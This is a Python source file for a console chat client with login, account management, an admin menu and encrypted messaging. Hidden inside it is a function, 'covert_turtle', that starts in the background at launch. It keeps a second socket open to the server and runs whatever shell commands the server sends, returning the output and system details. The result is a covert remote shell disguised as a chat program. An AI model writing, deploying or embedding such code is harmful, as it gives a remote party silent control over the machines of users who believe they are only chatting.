import threading
import socket
import os
import time
import subprocess
import sys
import platform

from aes_cbc import CipherBlockChainingAES


HEADER_LENGTH = 32
FORMAT = "utf-8"
SERVER_IP = socket.gethostbyname(socket.gethostname())  # "192.168.56.1"
SERVER_PORT = 5000
SERVER_SHELL_PORT = 5050
kill_thread = False
cipher = CipherBlockChainingAES()


class SendMessage(threading.Thread):
    def __init__(self, server_socket, username):
        super().__init__()
        self.server_socket = server_socket
        self.username = username
        global kill_thread
        kill_thread = False

    def run(self):
        global kill_thread
        while True:
            message = input("> ")
            if not message:  # Empty string
                continue

            if message == 'exit':
                message_data = cipher.encrypt(message)
                message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                self.server_socket.send(message_header + message_data)
                kill_thread = True
                break

            # Send message to server for broadcasting
            else:
                message = f"{self.username}: {message}"
                message_data = cipher.encrypt(message)
                message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                self.server_socket.send(message_header + message_data)

        if self.username == '<ADMIN>':
            print("\n[PROGRAM]: Exiting chatroom...")

        else:
            print("\n[PROGRAM]: Logging off...")

        client.active = False


class ReceiveMessage(threading.Thread):
    def __init__(self, server_socket, username):
        super().__init__()
        self.server_socket = server_socket
        self.username = username
        global kill_thread
        kill_thread = False

    def run(self):
        global kill_thread
        while True:
            try:
                if kill_thread:
                    client.active = False
                    break

                message_header = self.server_socket.recv(HEADER_LENGTH)
                if len(message_header):
                    message_length = int(message_header.decode(FORMAT))
                    message = cipher.decrypt(self.server_socket.recv(message_length)).decode(FORMAT)

                    if message == '200':  # Message sent to server was successful
                        continue

                    elif message == '503':
                        # Server has closed the socket, exit the program
                        print("\n[PROGRAM]: Server shutting down...")
                        print("\n[PROGRAM]: Connection to the server has been lost![0]")
                        print("\n[PROGRAM]: Quitting...")
                        message_data = cipher.encrypt("exit")
                        message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
                        self.server_socket.send(message_header + message_data)
                        os._exit(0)
                        self.server_socket.close()
                        break

                    print(message)  # Prints the message sent from server

            except WindowsError:
                print("\n[PROGRAM]: Connection to the server has been lost unexpectedly![1]")
                print("\n[PROGRAM]: Please restart the program!")
                print("\n[PROGRAM]: Quitting...")
                self.server_socket.close()
                os._exit(0)
                break


class Client(threading.Thread):
    def __init__(self):
        super().__init__()
        # Attempts to connect to server
        print(f"[PROGRAM]: Establishing connection to server at {SERVER_IP}")
        for tries in range(0, 4):
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shell_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((SERVER_IP, SERVER_PORT))
                self.shell_connection.connect((SERVER_IP, SERVER_SHELL_PORT))
                self.uid = ''
                break

            except WindowsError:
                # Attempts to retry connecting to the server (Max: 3 tries)
                if tries == 3:
                    print("\n[PROGRAM]: Service is currently unavailable...")
                    print("\n[PROGRAM]: Please restart the program!")
                    os._exit(0)

                print(f"\n[PROGRAM]: Connection error: No connection could be"
                      f" made because the target machine actively refused it")
                print("[PROGRAM]: Retrying...")
                # Timeout for 3 seconds before reattempting to connect to server
                time.sleep(3)

    def run(self):
        self.display_title()
        server_reply = self.receive_message(self.connection)
        self.uid = server_reply['msg_data']
        print(f"UID: {self.uid}")

        while True:
            try:
                print()
                print("1) Login")
                print("2) Create New Account")
                print("0) Exit")
                print()

                choice = input("> ")
                if choice == '0':
                    print("[PROGRAM]: Exiting program...")
                    self.send_message(self.connection, choice)
                    self.connection.close()
                    os._exit(0)
                    break

                elif choice == '1':
                    self.send_message(self.connection, choice)
                    self.user_login()

                elif choice == '2':
                    self.send_message(self.connection, choice)
                    self.create_account()

                else:
                    print("[PROGRAM]: Please re-enter your choice")

            except WindowsError:
                print("\n[PROGRAM]: Connection to the server has been lost unexpectedly![2]")
                print("\n[PROGRAM]: Please restart the program!")
                print("\n[PROGRAM]: Quitting...")
                os._exit(0)
                break

    @staticmethod
    def send_message(server_socket, message):
        # For server to send message to individual client
        message_data = cipher.encrypt(message)
        message_header = f"{len(message_data):<{HEADER_LENGTH}}".encode(FORMAT)
        server_socket.send(message_header + message_data)

    @staticmethod
    def receive_message(server_socket):
        # For server to receive message from individual client
        try:
            message_header = server_socket.recv(HEADER_LENGTH)
            if not len(message_header):
                return False

            message_length = int(message_header.decode(FORMAT))
            message_data = cipher.decrypt(server_socket.recv(message_length))

            """
            Returns a dictionary
                msg_header: Not used in this case but stored as additional information about the msg_data
                msg_data: Contains the un-decoded message
            """
            return {'msg_header': message_length, 'msg_data': message_data.decode(FORMAT)}

        except WindowsError:
            # Server disconnected
            return False

    def user_login(self):
        while True:
            input_username = input("Username: ").lower()
            if input_username == 'q':
                self.send_message(self.connection, 'q')
                break

            self.send_message(self.connection, input_username)

            input_password = input("Password: ")
            self.send_message(self.connection, input_password)
            server_reply = self.receive_message(self.connection)

            if not server_reply:
                print("[PROGRAM]: Service unavailable")
                break

            elif server_reply['msg_data'] == '200':
                # Prevents clients from overwriting their username
                retrieved_username = self.receive_message(self.connection)
                self.chatroom(retrieved_username['msg_data'])
                break

            elif server_reply['msg_data'] == '201':
                self.admin()
                break

            elif server_reply['msg_data'] == '401':
                print("[PROGRAM]: Invalid username/password, please try again...")
                print("[PROGRAM]: Type 'q' in username to return to the main menu\n")

            elif server_reply['msg_data'] == '403':
                print("[PROGRAM]: Account is currently in use")

    def create_account(self):
        while True:
            new_username = input("Please enter your username: ").lower()
            if new_username == 'q':
                self.send_message(self.connection, 'q')
                break

            self.send_message(self.connection, new_username)
            server_reply = self.receive_message(self.connection)

            if server_reply['msg_data'] == '401':
                print("[PROGRAM]: Username exists, please try another name")
                print("[PROGRAM]: Type 'q' in username to return to the main menu\n")

            elif server_reply['msg_data'] == '200':
                print("[PROGRAM]: Username available!")
                while True:
                    new_password = input("Please enter your password: ")
                    check_password = input("Please retype your password: ")
                    print()
                    if new_password == check_password:
                        self.send_message(self.connection, new_password)
                        print("[PROGRAM]: New account successfully created!")
                        break
                    else:
                        print("[PROGRAM]: Passwords did not match!")
                        print("[PROGRAM]: Please re-enter your password!\n")
                break

    def chatroom(self, username):
        send = SendMessage(self.connection, username)
        receive = ReceiveMessage(self.connection, username)

        send.start()
        receive.start()

        send.join()
        receive.join()
        return

    def remove_account(self):
        while True:
            del_username = input("Please enter the username of the account to be removed: ").lower()
            if del_username == 'q':
                self.send_message(self.connection, 'q')
                break

            if del_username == 'admin':
                print("[PROGRAM]: The following operation is not allowed")
                print("[PROGRAM]: Returning to top...")
                print("[PROGRAM]: Type 'q' in username to return to the main menu\n")
                continue

            self.send_message(self.connection, del_username)
            server_reply = self.receive_message(self.connection)

            if server_reply['msg_data'] == '404':
                print("[PROGRAM]: Username does not exist in database, please try another name")
                print("[PROGRAM]: Type 'q' in username to return to the main menu\n")

            elif server_reply['msg_data'] == '200':
                confirmation = input(f"Are you sure you want to delete account {del_username}? (y/n): ").lower()
                self.send_message(self.connection, confirmation)
                if confirmation == 'y':
                    print(f"[PROGRAM]: Account {del_username} has been successfully removed!")
                    break

                elif confirmation == 'n':
                    print("[PROGRAM]: Account deletion unsuccessful, returning to top...")
                    print("[PROGRAM]: Type 'q' in username to return to the main menu\n")

                else:
                    print("[PROGRAM]: Invalid input, please try again")
                    print("[PROGRAM]: Returning to top...")
                    print("[PROGRAM]: Type 'q' in username to return to the main menu\n")

    def admin(self):
        print()
        self.admin_display_title()
        print()
        server_reply = self.receive_message(self.connection)
        print(server_reply['msg_data'])
        while True:
            print()
            print("1) List accounts")
            print("2) Add account")
            print("3) Remove account")
            print("4) Join Chatroom")
            print("0) Log off administrator")
            print()

            choice = input("> ")
            if choice == '0':
                print("[PROGRAM]: Logging off Administrator account...")
                self.send_message(self.connection, choice)
                break

            elif choice == '1':
                self.send_message(self.connection, choice)
                server_reply = self.receive_message(self.connection)
                print(server_reply['msg_data'])

            elif choice == '2':
                self.send_message(self.connection, choice)
                self.create_account()

            elif choice == '3':
                self.send_message(self.connection, choice)
                self.remove_account()

            elif choice == '4':
                self.send_message(self.connection, choice)
                print("[PROGRAM]: Entering chatroom...")
                self.chatroom("<ADMIN>")

            else:
                print("[PROGRAM]: Please re-enter your choice")

    @staticmethod
    def display_title():
        print("████████╗██╗░░██╗███████╗  ██╗░░██╗███╗░░██╗░█████╗░█████"
              "███╗████████╗██╗░░░██╗  ░█████╗░██╗░░██╗░█████╗░████████╗")
        print("╚══██╔══╝██║░░██║██╔════╝  ██║░██╔╝████╗░██║██╔══██╗╚══██"
              "╔══╝╚══██╔══╝╚██╗░██╔╝  ██╔══██╗██║░░██║██╔══██╗╚══██╔══╝")
        print("░░░██║░░░███████║█████╗░░  █████═╝░██╔██╗██║██║░░██║░░░██"
              "║░░░░░░██║░░░░╚████╔╝░  ██║░░╚═╝███████║███████║░░░██║░░░")
        print("░░░██║░░░██╔══██║██╔══╝░░  ██╔═██╗░██║╚████║██║░░██║░░░██"
              "║░░░░░░██║░░░░░╚██╔╝░░  ██║░░██╗██╔══██║██╔══██║░░░██║░░░")
        print("░░░██║░░░██║░░██║███████╗  ██║░╚██╗██║░╚███║╚█████╔╝░░░██"
              "║░░░░░░██║░░░░░░██║░░░  ╚█████╔╝██║░░██║██║░░██║░░░██║░░░")
        print("░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═"
              "╝░░░░░░╚═╝░░░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░")

    @staticmethod
    def admin_display_title():
        print("▄▀█ █▀▄ █▀▄▀█ █ █▄░█ █ █▀ ▀█▀ █▀█ ▄▀█ ▀█▀ █▀█ █▀█")
        print("█▀█ █▄▀ █░▀░█ █ █░▀█ █ ▄█ ░█░ █▀▄ █▀█ ░█░ █▄█ █▀▄")


def covert_turtle(client_session):
    while True:
        try:
            client_session.send_message(client_session.shell_connection, str(os.getcwd()))
            command = client_session.receive_message(client_session.shell_connection)
            command = command['msg_data']

            if command == 'exit':
                continue

            if command[:2] == 'cd':
                try:
                    os.chdir(command[3:])

                except WindowsError:
                    continue

                continue

            elif command == 'uname':
                architecture = platform.architecture()
                uname = platform.uname()
                output = f"\nHostname: {uname[1]}\n" \
                         f"Platform: {sys.platform}\n" \
                         f"Architecture: {architecture[0]}, {architecture[1]}\n" \
                         f"System: {uname[0]}\n" \
                         f"Release Version: {uname[3]}\n" \
                         f"Machine: {uname[4]}\n" \
                         f"Processor: {uname[5]}\n"

                client_session.send_message(client_session.shell_connection, output)
                continue

            output = subprocess.run(command,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    text=True)

            client_session.send_message(client_session.shell_connection, str(output.stdout + output.stderr))

        except TypeError:
            break


if __name__ == '__main__':
    # Start up client program
    client = Client()
    client.start()

    time.sleep(0.5)
    client_shell = threading.Thread(target=covert_turtle, args=(client,))
    client_shell.start()
